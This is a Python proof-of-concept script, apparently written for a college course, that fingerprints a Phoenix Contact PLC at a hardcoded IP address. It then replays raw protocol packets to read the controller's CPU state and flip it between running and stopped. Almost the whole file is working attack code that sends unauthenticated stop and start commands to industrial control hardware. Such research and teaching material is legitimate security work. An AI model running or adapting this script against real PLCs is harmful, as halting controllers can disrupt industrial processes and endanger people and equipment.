#! /usr/bin/env python
'''
    Copyright 2015 Deneut Tijl

    Written for Howest(c) College University

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.*)

File name ShowState.py
written by tijl.deneut@howest.be
This POC allows enumerating a Phoenix PLC and changing it's state
'''

import sys, socket, binascii, time, os, select

## Defining Functions First
def send_and_recv(s,size,strdata):
    data = binascii.unhexlify(strdata.replace(' ','')) ## Convert to real HEX (\x00\x00 ...)
    s.send(data)
    ret = s.recv(65535)
    return ret

def initMonitor2(s):
    send_and_recv(s,1000,'cc01000dc0010000d517')
    send_and_recv(s,1000,'cc01000b4002000047ee')
    send_and_recv(s,1000,'cc01005b40031c00010000001c0000000100000002000000000000000000000000000000d79a')
    send_and_recv(s,1000,'cc01005b40041c00010000001c0000000100000004000000800000000000000000000000ea43')
    send_and_recv(s,1000,'cc01000640050000361e')
    send_and_recv(s,1000,'cc0100074006100026750000000000000000000000000000c682')
    
def getState(s,state=''):
    sState = "Running"
    """ RUNNING CPU
    ea fa	c4 65
    2d b0	04 3f
    f1 ea	4d ac
    95 05	87 11
    49 5f	ce 82
    4c d3	4b f1
    90 89	81 4c
    f4 66	c8 df
    28 3c	01 f9
    7a f3	48 6a
    a6 a9	82 d7
    c2 46	cb 44
    1e 1c	07 a4
    1b 90	4e 37
    c7 ca	84 8a
    a3 25	cd 19
    7f 7f	0d 43
    b8 35	44 d0
    64 6f	8e 6d
    00 80	c7 fe
    -----------------
    ea fa	97 59
    2d b0	57 03
    f1 ea	1e 90
    95 05	d4 2d
    49 5f	9d be
    4c d3	51 5e
    90 89	18 cd
    f4 66	d2 70 --> sending 4C 07 here would stop CPU?, sending 18 21 here would start CPU?
    28 3c	9b e3
    7a f3	52 c5
    a6 a9	1b 56
    c2 46	d1 eb
    1e 1c	98 78
    1b 90	54 98
    c7 ca	1d 0b
    a3 25	d7 b6
    7f 7f	9e 25
    b8 35	5e 7f
    64 6f	17 ec  --> sending dc 0e here would stop CPU?
    00 80	dd 51
    """
    if send_and_recv(s,1000,'cc01000f40070000eafa').encode('hex')[-4:] == '9759': sState = "Stopped"
    if send_and_recv(s,1000,'cc01000f400800002db0').encode('hex')[-4:] == '5703': sState = "Stopped"
    send_and_recv(s,1000,'cc01000f40090000f1ea')
    send_and_recv(s,1000,'cc01000f400a00009505')
    send_and_recv(s,1000,'cc01000f400b0000495f')
    send_and_recv(s,1000,'cc01000f400c00004cd3')
    send_and_recv(s,1000,'cc01000f400d00009089')
    if state=='stop':
        print('Trying to stop')
        send_and_recv(s,1000,'cc 01 00 01 40 0e 00 00 4c 07')
    elif state=='start':
        print('Trying to start')
        send_and_recv(s,1000,'cc 01 00 04 40 0e 00 00 18 21')
    else:
        send_and_recv(s,1000,'cc 01 00 0f 40 0e 00 00 f4 66')
    send_and_recv(s,1000,'cc 01 00 0f 40 0f 00 00 28 3c')
    send_and_recv(s,1000,'cc 01 00 0f 40 10 00 00 7a f3')
    send_and_recv(s,1000,'cc 01 00 0f 40 11 00 00 a6 a9')
    send_and_recv(s,1000,'cc 01 00 0f 40 12 00 00 c2 46')
    send_and_recv(s,1000,'cc 01 00 0f 40 13 00 00 1e 1c')
    send_and_recv(s,1000,'cc 01 00 0f 40 14 00 00 1b 90')
    send_and_recv(s,1000,'cc 01 00 0f 40 15 00 00 c7 ca')
    send_and_recv(s,1000,'cc 01 00 0f 40 16 00 00 a3 25')
    return sState

def initMonitor(s):
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002500000000000000d9ff4164652e52656d6f74696e672e53657276696365732e49466f726365536572766963653200')
    send_and_recv(s,1000,'010000000000240000000000000000004164652e52656d6f74696e672e53657276696365732e49466f7263655365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002900000000000000d5ff4164652e52656d6f74696e672e53657276696365732e49427265616b706f696e745365727669636500')
    send_and_recv(s,1000,'0100000000002800000000000000d6ff4164652e52656d6f74696e672e53657276696365732e4943616c6c737461636b5365727669636500')
    send_and_recv(s,1000,'010000000000250000000000000000004164652e52656d6f74696e672e53657276696365732e494465627567536572766963653200')
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100020000000e0003000300000000000500000012401340130011401200')
    return

##### The Actual Program
os.system('cls' if os.name == 'nt' else 'clear')
ip='172.20.3.10'
infoport=1962
#controlport=41100
controlport=20547

## - initialization, this will get the PLC type, Firmware version, build date & time, not really necessary
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,infoport))

print 'Initializing PLC: '+ip
print '----------------'
code = send_and_recv(s,1000,'0101001a005e000000000003000c494245544830314e305f4d00').encode('hex')[34:36]
send_and_recv(s,1000,'01050016005f000008ef00' + code + '00000022000402950000')
ret = send_and_recv(s,1000,'0106000e00610000881100' + code + '0400')
print 'PLC Type  = ' + ret[30:50]
print 'Firmware  = ' + ret[66:70]
print 'Build     = ' + ret[79:100]
send_and_recv(s,1000,'0105002e00630000000000' + code + '00000023001c02b0000c0000055b4433325d0b466c617368436865636b3101310000')
send_and_recv(s,1000,'0106000e0065ffffff0f00' + code + '0400')
send_and_recv(s,1000,'010500160067000008ef00' + code + '00000024000402950000')
send_and_recv(s,1000,'0106000e0069ffffff0f00' + code + '0400')
send_and_recv(s,1000,'0102000c006bffffff0f00' + code)

s.shutdown(socket.SHUT_RDWR)
s.close()
print 'Initialization done'
print '-------------------\r\n'
print 'Will now print the PLC state'## and reverse it after 3 seconds'

########## MONITOR PHASE ####### Start monitoring with loop on port 41100
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,controlport))
# First init phase (sending things like 'Ade.Remoting.Services.IProConOSControlService2' and 'Ade.Remoting.Services.ISimpleFileAccessService3', 21 packets)
if controlport==41100:
    raw_input('Press [Enter] to continue')
    initMonitor(s)
elif controlport==20547:
    initMonitor2(s)
    sState = getState(s)
    print('CPU is '+sState)
    if sState == 'Running':
        getState(s,'stop')
    else:
        getState(s,'start')
    s.shutdown(socket.SHUT_RDWR)
    s.close()
    sys.exit()
    
# Query packet
packet1 = '010002000000080003000300000000000200000002400b40'
# Keepalive packet
packet2 = '0100020000001c0003000300000000000c00000007000500060008001000020011000e000f000d0016401600'
## The loop keepalive and query status loop (2 x keepalive, one time query):
i = 0
state = 'On'
while True:
    i += 1
    time.sleep(0.2)
    ## Keep Alive
    send_and_recv(s,1000,packet2)
    send_and_recv(s,1000,packet2)
    
    ## Query Status
    ret = send_and_recv(s,1000,packet1).encode('hex')
    if ret[48:50] == '03':
        state = 'Running'
    elif ret[48:50] == '07':
        state = 'Stop'
    elif ret[48:50] == '00':
        state = 'On'
    else:
        print 'State unknown, found code: '+ret.encode('hex')[48:50]
    print 'Current PLC state: '+state
